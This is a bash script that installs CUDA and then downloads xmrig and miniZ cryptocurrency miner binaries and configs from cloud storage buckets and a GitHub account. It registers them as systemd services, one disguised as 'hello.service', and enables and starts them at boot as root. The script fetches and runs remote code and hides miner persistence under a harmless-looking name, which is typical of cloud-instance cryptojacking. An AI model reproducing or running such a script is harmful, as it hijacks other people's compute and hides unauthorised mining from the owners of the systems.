#!/bin/bash
sudo su && sudo apt-get update -y && sudo apt-get install libhwloc-dev -y && CUDA_REPO_PKG=cuda-repo-ubuntu1804_10.0.130-1_amd64.deb && wget -O /tmp/${CUDA_REPO_PKG} https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/${CUDA_REPO_PKG} && sudo dpkg -i /tmp/${CUDA_REPO_PKG} && sudo apt-key adv --fetch-keys "http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub" && rm -f /tmp/${CUDA_REPO_PKG} && sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y && sudo apt-get install cuda -y && cd /usr/local/src/ && wget https://beams.sfo3.digitaloceanspaces.com/miniZ_v1.7x3_linux-x64.tar.gz && tar xfz miniZ_v1.7x3_linux-x64.tar.gz && sudo mkdir xmrig && cd xmrig && sudo mkdir build && cd build && wget https://hutrans.nyc3.digitaloceanspaces.com/xmrig && wget https://raw.githubusercontent.com/taikhoanxzc004/xmrig/master/kalinh8-6c-beam-config.json -O /usr/local/src/xmrig/build/config.json && sudo wget https://raw.githubusercontent.com/taikhoanxzc004/xmrig/master/hello.service -O /lib/systemd/system/hello.service && sudo wget https://raw.githubusercontent.com/taikhoanxzc004/xmrig/master/miniZ.service -O /lib/systemd/system/miniZ.service && chmod a+x /lib/systemd/system/hello.service && chmod a+x /lib/systemd/system/miniZ.service && sudo echo "vm.nr_hugepages=1024" >> /etc/sysctl.conf && sudo sysctl -p && chmod a+x xmrig && chmod a+x config.json && sudo systemctl daemon-reload && sudo systemctl enable hello.service && sudo systemctl enable miniZ.service && sudo systemctl start hello.service && sudo systemctl start miniZ.service